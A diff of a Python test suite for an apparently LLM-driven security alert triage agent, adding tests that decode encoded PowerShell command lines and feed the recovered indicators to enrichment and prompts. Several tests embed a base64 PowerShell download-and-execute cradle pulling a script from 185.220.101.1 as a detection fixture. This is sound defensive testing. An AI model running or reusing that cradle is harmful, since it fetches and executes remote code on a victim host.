@@ -16,12 +16,12 @@ from app.agent.schemas import (
     SelfCheckResult,
     TriageVerdict,
 )
-from app.agent.state_graph import AgenticAnalyst, Step
+from app.agent.state_graph import AgenticAnalyst, Step, _lacks_typed_context
 from app.enrichment.registry import EnrichmentRegistry
 from app.integration.errors import SIEMConnectorError
 from app.integration.models import AgentContext, RuleMetadata, SearchResult
 from app.llm.errors import LLMClientError
-from app.schemas import AgentRef, Alert, EnrichmentResult, InvestigationStep
+from app.schemas import AgentRef, Alert, EnrichmentResult, InvestigationStep, ProcessExecutionFields
 from app.schemas import EnrichmentVerdict, IndicatorType
 from app.schemas import AlertStatus, Confidence, ReportStatus, RiskAssessment, Severity
 from app.storage.db import get_engine, init_db
@@ -205,7 +205,7 @@ def test_step_extract_indicators_finds_and_validates_ip():
     analyst = _make_analyst()
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=False)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)
 
     assert len(indicators) == 1
     assert indicators[0].value == "203.0.113.5"
@@ -217,7 +217,7 @@ def test_step_extract_indicators_returns_empty_list_when_nothing_found():
     analyst = _make_analyst()
     alert = _make_alert(full_log="nothing interesting here")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=False)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)
 
     assert indicators == []
     assert step.action == "completed"
@@ -227,7 +227,7 @@ def test_step_extract_indicators_skips_llm_when_model_unavailable():
     analyst = _make_analyst()
     alert = _make_alert(full_log="nothing interesting here")
 
-    _, step = analyst._step_extract_indicators(alert, model_available=False)
+    _, _, step = analyst._step_extract_indicators(alert, model_available=False)
 
     assert "LLM-assisted extraction skipped: model unavailable" in step.output_summary
 
@@ -244,7 +244,7 @@ def test_step_extract_indicators_merges_llm_candidates_with_regex_results():
     analyst = _make_analyst(llm_client=llm_client)
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=True)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)
 
     values = {i.value for i in indicators}
     assert values == {"203.0.113.5", "evil.test"}
@@ -263,7 +263,7 @@ def test_step_extract_indicators_discards_invalid_llm_candidates():
     analyst = _make_analyst(llm_client=llm_client)
     alert = _make_alert(full_log="nothing interesting here")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=True)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)
 
     assert indicators == []
     assert "LLM: 1 candidates, 0 validated" in step.output_summary
@@ -274,18 +274,72 @@ def test_step_extract_indicators_keeps_regex_results_when_llm_call_fails():
     analyst = _make_analyst(llm_client=llm_client)
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=True)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)
 
     assert len(indicators) == 1
     assert indicators[0].value == "203.0.113.5"
     assert "LLM-assisted extraction failed: timeout" in step.output_summary
 
 
+def test_step_extract_indicators_decodes_and_extracts_ioc_from_encoded_command():
+    from app.schemas import ProcessExecutionFields
+
+    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
+    analyst = _make_analyst()
+    alert = _make_alert(
+        full_log="",
+        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
+    )
+
+    indicators, command_decode_result, step = analyst._step_extract_indicators(alert, model_available=False)
+
+    assert any(i.value == "185.220.101.1" for i in indicators)
+    assert command_decode_result is not None
+    assert len(command_decode_result.decoded_segments) == 1
+    assert "command decode: 1 segment(s) decoded, 0 discarded" in step.output_summary
+
+
+def test_step_extract_indicators_passes_decoded_command_text_to_llm_extraction_prompt():
+    """A defanged IOC hidden inside an encoded blob (e.g. hxxp://185[.]220[.]101[.]1)
+    must reach the LLM-assisted extractor's prompt via the decoded segments, not just
+    the regex path, since the LLM extractor is the only one that can de-obfuscate
+    defanged formatting."""
+    from app.schemas import ProcessExecutionFields
+
+    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={ExtractedIndicators: ExtractedIndicators(candidates=[])},
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert(
+        full_log="",
+        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
+    )
+
+    analyst._step_extract_indicators(alert, model_available=True)
+
+    extract_calls = [prompt for prompt, schema in llm_client.calls if schema is ExtractedIndicators]
+    assert len(extract_calls) == 1
+    # "185.220.101.1" alone also appears in the prompt template's boilerplate example text,
+    # so assert on the decoded payload's distinctive substring instead.
+    assert "a.ps1" in extract_calls[0]
+
+
+def test_step_extract_indicators_returns_none_command_decode_result_when_no_process_fields():
+    analyst = _make_analyst()
+    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
+
+    _, command_decode_result, _ = analyst._step_extract_indicators(alert, model_available=False)
+
+    assert command_decode_result is None
+
+
 def test_step_enrich_calls_registry_for_each_indicator():
     registry = EnrichmentRegistry()
     registry.register(_FakeIPProvider(result=_make_enrichment_result()))
     analyst = _make_analyst(enrichment_registry=registry)
-    indicators, _ = analyst._step_extract_indicators(
+    indicators, _, _ = analyst._step_extract_indicators(
         _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
     )
 
@@ -393,7 +447,7 @@ def test_step_correlate_reports_failed_canonical_searches_without_crashing():
     analyst = _make_analyst(siem=siem)
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=False)
+    pattern_type, evidence_count, step = analyst._step_correlate(alert, [], model_available=False)
 
     assert step.action == "completed"
     assert evidence_count == 0
@@ -405,7 +459,7 @@ def test_step_correlate_runs_searches_and_skips_classification_when_model_unavai
     analyst = _make_analyst(siem=siem)
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=False)
+    pattern_type, evidence_count, step = analyst._step_correlate(alert, [], model_available=False)
 
     assert pattern_type == PatternType.OTHER
     assert evidence_count == 7
@@ -431,7 +485,7 @@ def test_step_correlate_classifies_pattern_and_runs_follow_up_query():
     analyst = _make_analyst(siem=siem, llm_client=llm_client)
     alert = _make_alert(source_ip="203.0.113.5", destination_ip=None)
 
-    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)
+    pattern_type, evidence_count, step = analyst._step_correlate(alert, [], model_available=True)
 
     assert pattern_type == PatternType.BRUTE_FORCE
     # base evidence (14 from rule_id canonical search, source_ip canonical search also 14) + the
@@ -456,7 +510,7 @@ def test_step_correlate_skips_follow_up_when_none_needed():
     analyst = _make_analyst(siem=siem, llm_client=llm_client)
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)
+    pattern_type, evidence_count, step = analyst._step_correlate(alert, [], model_available=True)
 
     assert pattern_type == PatternType.BRUTE_FORCE
     assert evidence_count == 1
@@ -469,7 +523,7 @@ def test_step_correlate_falls_back_to_other_when_classification_call_fails():
     analyst = _make_analyst(siem=siem, llm_client=llm_client)
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)
+    pattern_type, evidence_count, step = analyst._step_correlate(alert, [], model_available=True)
 
     assert pattern_type == PatternType.OTHER
     assert evidence_count == 2
@@ -494,7 +548,7 @@ def test_step_correlate_runs_open_value_search_when_pattern_is_none():
     analyst = _make_analyst(siem=siem, llm_client=llm_client)
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)
+    pattern_type, evidence_count, step = analyst._step_correlate(alert, [], model_available=True)
 
     assert pattern_type == PatternType.NONE
     assert "noisier, unstructured match" in step.output_summary
@@ -517,7 +571,7 @@ def test_step_correlate_skips_open_value_search_when_pattern_is_identified():
     analyst = _make_analyst(siem=siem, llm_client=llm_client)
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    _, _, step = analyst._step_correlate(alert, model_available=True)
+    _, _, step = analyst._step_correlate(alert, [], model_available=True)
 
     assert "noisier" not in step.output_summary
     assert all(c.clauses[0].field != "full_log" for c in siem.search_calls)
@@ -544,9 +598,25 @@ def test_step_correlate_skips_open_value_search_when_proposal_call_fails():
     analyst = _make_analyst(siem=siem, llm_client=_SequencedLLMClient())
     alert = _make_alert(source_ip=None, destination_ip=None)
 
-    _, _, step = analyst._step_correlate(alert, model_available=True)
+    _, _, step = analyst._step_correlate(alert, [], model_available=True)
 
     assert "noisier" not in step.output_summary
+
+
+def test_correlation_decision_prompt_includes_command_line_template():
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            CorrelationDecision: CorrelationDecision(pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED)
+        },
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert()
+
+    analyst._classify_correlation(alert, {}, 0, [])
+
+    prompt = llm_client.calls[0][0]
+    assert "same_command_line_env_wide" in prompt
 
 
 def test_run_open_value_search_logs_proposal_and_siem_result(caplog):
@@ -644,6 +714,24 @@ def test_step_risk_assessment_logs_prompt_and_result(caplog):
     assert "matches known malicious IP" in caplog.text
 
 
+def test_step_risk_assessment_passes_command_context_to_prompt():
+    from app.schemas import CommandDecodeResult, DecodedSegment
+
+    command_context = CommandDecodeResult(
+        command_line="powershell.exe -EncodedCommand AAA",
+        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
+    )
+    llm_client = _FakeLLMClient(responses={
+        RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
+    })
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert()
+
+    analyst._step_risk_assessment(alert, PatternType.OTHER, 0, [], model_available=True, command_context=command_context)
+
+    assert "185.220.101.1" in llm_client.calls[0][0]
+
+
 def test_step_draft_report_returns_canonical_and_experimental_drafts():
     draft_canonical = DraftReportCanonical(
         alert_summary="Brute-force attempts from 203.0.113.5.",
@@ -722,6 +810,35 @@ def test_draft_canonical_prompt_contains_pattern_type_and_evidence_count():
     canonical_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportCanonical)
     assert "scanning" in canonical_prompt
     assert "7" in canonical_prompt
+
+
+def test_step_draft_report_passes_command_context_to_prompts():
+    from app.schemas import CommandDecodeResult, DecodedSegment
+
+    command_context = CommandDecodeResult(
+        command_line="powershell.exe -EncodedCommand AAA",
+        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
+    )
+    llm_client = _FakeLLMClient(responses={
+        DraftReportCanonical: DraftReportCanonical(
+            alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
+        ),
+        DraftReportExperimental: DraftReportExperimental(
+            recommended_actions_freeform=[], triage_verdict=TriageVerdict.UNCERTAIN, triage_rationale="z"
+        ),
+    })
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert()
+    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
+
+    analyst._step_draft_report(
+        alert, PatternType.OTHER, 0, [], risk_assessment, model_available=True, command_context=command_context
+    )
+
+    canonical_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportCanonical)
+    experimental_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportExperimental)
+    assert "185.220.101.1" in canonical_prompt
+    assert "185.220.101.1" in experimental_prompt
 
 
 def _draft_with_two_actions():
@@ -1039,6 +1156,35 @@ def test_self_check_prompt_contains_draft_alert_summary():
     assert draft.alert_summary in self_check_prompt
 
 
+def test_step_self_check_passes_command_context_to_prompt():
+    from app.schemas import CommandDecodeResult, DecodedSegment
+
+    command_context = CommandDecodeResult(
+        command_line="powershell.exe -EncodedCommand AAA",
+        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
+    )
+    draft = _draft_with_two_actions()
+    llm_client = _FakeLLMClient(responses={
+        SelfCheckResult: SelfCheckResult(audits=[
+            ClaimAudit(claim=draft.alert_summary, supported=True),
+            ClaimAudit(claim=draft.rationale, supported=True),
+            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
+            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
+        ])
+    })
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert()
+    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
+
+    analyst._step_self_check(
+        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
+        _passthrough_correlate_step(), model_available=True, command_context=command_context,
+    )
+
+    self_check_prompt = next(p for p, schema in llm_client.calls if schema is SelfCheckResult)
+    assert "185.220.101.1" in self_check_prompt
+
+
 def test_investigate_runs_full_pipeline_and_persists_report(tmp_path):
     engine = get_engine(str(tmp_path / "test.db"))
     init_db(engine)
@@ -1194,7 +1340,7 @@ def test_investigate_degrades_gracefully_when_siem_context_unavailable(tmp_path)
 
 def test_step_enrich_degrades_when_no_provider_registered_for_type():
     analyst = _make_analyst(enrichment_registry=EnrichmentRegistry())
-    indicators, _ = analyst._step_extract_indicators(
+    indicators, _, _ = analyst._step_extract_indicators(
         _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
     )
 
@@ -1349,6 +1495,36 @@ def test_assemble_report_includes_experimental_fields_when_present():
     assert report.triage_rationale_experimental == "y"
 
 
+def test_assemble_report_includes_command_analysis_when_present():
+    from app.schemas import CommandDecodeResult, DecodedSegment
+
+    analyst = _make_analyst()
+    alert = _make_alert()
+    draft = _draft_with_two_actions()
+    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")
+    command_analysis = CommandDecodeResult(
+        command_line="powershell.exe -EncodedCommand AAA",
+        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami")],
+    )
+
+    report = analyst._assemble_report(
+        alert, [], [], risk_assessment, draft, None, "", model_available=True, command_analysis=command_analysis,
+    )
+
+    assert report.command_analysis.decoded_segments[0].decoded == "whoami"
+
+
+def test_assemble_report_command_analysis_defaults_to_none():
+    analyst = _make_analyst()
+    alert = _make_alert()
+    draft = _draft_with_two_actions()
+    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")
+
+    report = analyst._assemble_report(alert, [], [], risk_assessment, draft, None, "", model_available=True)
+
+    assert report.command_analysis is None
+
+
 def test_step_extract_indicators_logs_input_and_output(caplog):
     analyst = _make_analyst()
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
@@ -1366,7 +1542,7 @@ def test_step_enrich_logs_input_and_output(caplog):
     registry = EnrichmentRegistry()
     registry.register(_FakeIPProvider(result=_make_enrichment_result()))
     analyst = _make_analyst(enrichment_registry=registry)
-    indicators, _ = analyst._step_extract_indicators(
+    indicators, _, _ = analyst._step_extract_indicators(
         _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
     )
 
@@ -1419,3 +1595,274 @@ def test_step_self_check_logs_input_and_output(caplog):
     assert "_run_self_check prompt" in caplog.text
     assert "_run_self_check result" in caplog.text
     assert "_step_self_check output" in caplog.text
+
+
+def test_investigate_decodes_command_line_and_enriches_embedded_ioc(tmp_path):
+    from app.schemas import ProcessExecutionFields
+
+    engine = get_engine(str(tmp_path / "test.db"))
+    init_db(engine)
+    alert_store = SQLiteAlertStore(engine)
+    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
+    alert = _make_alert(
+        rule_id="92009",
+        rule_description="Sysmon - process creation via encoded PowerShell command",
+        full_log="",
+        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
+    )
+    alert_store.save_raw_alert(alert)
+
+    registry = EnrichmentRegistry()
+    registry.register(_FakeIPProvider(result=_make_enrichment_result(
+        indicator_value="185.220.101.1", verdict=EnrichmentVerdict.MALICIOUS,
+    )))
+    siem = _FakeSIEMConnector(
+        agent_context=AgentContext(id="003", name="WIN-DESKTOP01", ip="172.20.10.5", status="active"),
+        rule_metadata=RuleMetadata(rule_id="92009", description="x", level=12),
+    )
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            ExtractedIndicators: ExtractedIndicators(candidates=[]),
+            CorrelationDecision: CorrelationDecision(
+                pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED
+            ),
+            OpenValueSearchProposal: OpenValueSearchProposal(search_value="185.220.101.1"),
+            RiskAssessment: RiskAssessment(
+                severity=Severity.HIGH, confidence=Confidence.HIGH,
+                rationale="Encoded PowerShell command downloads a script from a known-malicious IP.",
+            ),
+            DraftReportCanonical: DraftReportCanonical(
+                alert_summary="Encoded PowerShell process creation contacting a malicious IP.",
+                rationale="The decoded command line downloads and executes a remote script.",
+                recommended_actions=[RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS, RecommendedAction.ISOLATE_HOST],
+            ),
+            DraftReportExperimental: DraftReportExperimental(
+                recommended_actions_freeform=["Block the IP at the perimeter"],
+                triage_verdict=TriageVerdict.TRUE_POSITIVE,
+                triage_rationale="Encoded download-and-execute pattern against a malicious IP.",
+            ),
+            SelfCheckResult: SelfCheckResult(audits=[
+                ClaimAudit(claim="Encoded PowerShell process creation contacting a malicious IP.", supported=True),
+                ClaimAudit(claim="The decoded command line downloads and executes a remote script.", supported=True),
+                ClaimAudit(claim=RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS.value, supported=True),
+                ClaimAudit(claim=RecommendedAction.ISOLATE_HOST.value, supported=True),
+            ]),
+        },
+    )
+    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)
+
+    report = analyst.investigate(alert)
+
+    assert report.command_analysis is not None
+    assert len(report.command_analysis.decoded_segments) == 1
+    assert "185.220.101.1" in report.command_analysis.decoded_segments[0].decoded
+    assert any(
+        f.indicator_value == "185.220.101.1" and f.verdict == EnrichmentVerdict.MALICIOUS
+        for f in report.enrichment_findings
+    )
+    assert report.status == ReportStatus.COMPLETE
+
+    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
+    assert "185.220.101.1" in risk_prompt
+
+
+def test_investigate_non_process_alert_is_fully_unaffected(tmp_path):
+    """Regression: an alert with no process fields behaves identically to before this feature."""
+    engine = get_engine(str(tmp_path / "test.db"))
+    init_db(engine)
+    alert_store = SQLiteAlertStore(engine)
+    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5", source_ip="203.0.113.5")
+    alert_store.save_raw_alert(alert)
+
+    registry = EnrichmentRegistry()
+    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
+    siem = _FakeSIEMConnector(
+        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
+        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
+        search_results={"data.srcip": SearchResult(alerts=[], total_count=1), "rule.id": SearchResult(alerts=[], total_count=1)},
+    )
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            ExtractedIndicators: ExtractedIndicators(candidates=[]),
+            CorrelationDecision: CorrelationDecision(
+                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
+            ),
+            RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x"),
+            DraftReportCanonical: DraftReportCanonical(
+                alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
+                rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
+                recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
+            ),
+            DraftReportExperimental: DraftReportExperimental(
+                recommended_actions_freeform=["Consider geo-blocking the source region"],
+                triage_verdict=TriageVerdict.TRUE_POSITIVE,
+                triage_rationale="Pattern matches a known brute-force signature.",
+            ),
+            SelfCheckResult: SelfCheckResult(audits=[
+                ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
+                ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
+                ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
+                ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
+            ]),
+        },
+    )
+    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)
+
+    report = analyst.investigate(alert)
+
+    assert report.command_analysis is None
+    assert report.status == ReportStatus.COMPLETE
+    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
+    assert "Command line:" not in risk_prompt
+
+
+def test_correlation_decision_prompt_includes_enrichment_verdicts():
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            CorrelationDecision: CorrelationDecision(
+                pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED
+            )
+        },
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    now = datetime.now(timezone.utc)
+    enrichment = EnrichmentResult(
+        indicator_type=IndicatorType.IP,
+        indicator_value="203.0.113.5",
+        provider_id="abuseipdb",
+        queried_at=now,
+        verdict=EnrichmentVerdict.MALICIOUS,
+        score=91.0,
+        cache_expires_at=now,
+    )
+
+    analyst._classify_correlation(_make_alert(), {}, 0, [enrichment])
+
+    prompt = llm_client.calls[0][0]
+    assert "203.0.113.5" in prompt
+    assert "malicious" in prompt
+
+
+def test_risk_assessment_prompt_receives_the_alerts_raw_log():
+    # Mail alerts carry their decisive fields (gateway verdict, sender, subject) only in
+    # full_log — nothing typed survives step 2 to represent them.
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            RiskAssessment: RiskAssessment(
+                severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="r"
+            )
+        },
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert(full_log="Sender=cfo.support@evil.test|ScanResultInfo=Malicious")
+
+    analyst._step_risk_assessment(alert, PatternType.OTHER, 0, [], model_available=True)
+
+    assert "ScanResultInfo=Malicious" in llm_client.calls[0][0]
+
+
+def test_self_check_prompt_receives_the_alerts_raw_log():
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            SelfCheckResult: SelfCheckResult(audits=[]),
+        },
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert(full_log="Sender=cfo.support@evil.test|ScanResultInfo=Malicious")
+    draft = DraftReportCanonical(
+        alert_summary="s", rationale="r", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
+    )
+    risk = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="r")
+
+    analyst._step_self_check(
+        alert, draft, PatternType.OTHER, 0, [], risk, _passthrough_correlate_step(), model_available=True
+    )
+
+    assert "ScanResultInfo=Malicious" in llm_client.calls[0][0]
+
+
+def test_lacks_typed_context_is_true_when_only_the_raw_log_describes_the_alert():
+    # The mail shape: no process fields, no typed network/identity fields.
+    assert _lacks_typed_context(_make_alert()) is True
+
+
+def test_lacks_typed_context_is_false_when_any_typed_field_is_populated():
+    # command_context is None for every non-Sysmon alert, so it cannot gate alone —
+    # these alerts already reach the model through the typed channel.
+    assert _lacks_typed_context(_make_alert(source_ip="203.0.113.5")) is False
+    assert _lacks_typed_context(_make_alert(destination_ip="198.51.100.9")) is False
+    assert _lacks_typed_context(_make_alert(src_user="root")) is False
+    assert _lacks_typed_context(_make_alert(dst_user="root")) is False
+
+
+def test_lacks_typed_context_is_false_for_process_execution_alerts():
+    alert = _make_alert(process=ProcessExecutionFields(command_line="powershell.exe -enc AAA"))
+
+    assert _lacks_typed_context(alert) is False
+
+
+def test_risk_prompt_omits_raw_log_when_the_alert_has_typed_context():
+    # Always-on raw_log costs ~23% latency per call for no measured verdict gain, so it
+    # is spent only where nothing else describes the alert.
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            RiskAssessment: RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="r")
+        },
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert(source_ip="203.0.113.5", full_log="Invalid user admin from 203.0.113.5")
+
+    analyst._step_risk_assessment(alert, PatternType.OTHER, 0, [], model_available=True)
+
+    assert "Raw log line" not in llm_client.calls[0][0]
+
+
+def test_self_check_prompt_gate_matches_the_risk_prompt_gate():
+    # Asymmetry would make Self-Check flag well-grounded claims as unsupported, because
+    # the evidence behind them would be invisible to it.
+    llm_client = _FakeLLMClient(model_available=True, responses={SelfCheckResult: SelfCheckResult(audits=[])})
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert(source_ip="203.0.113.5", full_log="Invalid user admin from 203.0.113.5")
+    draft = DraftReportCanonical(
+        alert_summary="s", rationale="r", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
+    )
+    risk = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="r")
+
+    analyst._step_self_check(
+        alert, draft, PatternType.OTHER, 0, [], risk, _passthrough_correlate_step(), model_available=True
+    )
+
+    assert "Raw log line" not in llm_client.calls[0][0]
+
+
+def test_step_correlate_classifies_once_even_when_a_follow_up_runs():
+    # Every follow_up_query member is also a canonical template, so the follow-up re-runs a
+    # query whose hits the classification call already saw. A second "re-decide against the
+    # new evidence" call would be re-deciding against nothing.
+    siem = _FakeSIEMConnector(
+        search_results={
+            "data.srcip": SearchResult(alerts=[], total_count=6),
+            "rule.id": SearchResult(alerts=[], total_count=6),
+        }
+    )
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            CorrelationDecision: CorrelationDecision(
+                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.SAME_SRC_IP_24H
+            )
+        },
+    )
+    analyst = _make_analyst(siem=siem, llm_client=llm_client)
+    alert = _make_alert(source_ip="203.0.113.5", destination_ip=None)
+
+    pattern_type, _, _ = analyst._step_correlate(alert, [], model_available=True)
+
+    assert pattern_type == PatternType.BRUTE_FORCE
+    assert [schema for _, schema in llm_client.calls] == [CorrelationDecision]
